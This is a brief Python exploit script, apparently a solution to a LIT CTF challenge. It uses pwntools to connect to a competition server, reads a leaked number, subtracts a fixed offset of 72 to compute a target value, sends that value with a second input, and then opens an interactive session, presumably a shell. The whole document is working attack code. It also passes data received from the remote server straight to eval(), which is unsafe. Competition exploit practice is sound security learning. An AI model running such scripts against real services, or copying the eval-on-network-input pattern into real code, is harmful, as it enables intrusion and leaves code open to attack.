from pwn import *

NC = "nc litctf.org 31772".split()
r = remote(NC[1],NC[2])

d = eval(r.recvline(0))
a = d - 72

r.sendline(str(a).encode())
r.sendline(b"1")

r.interactive()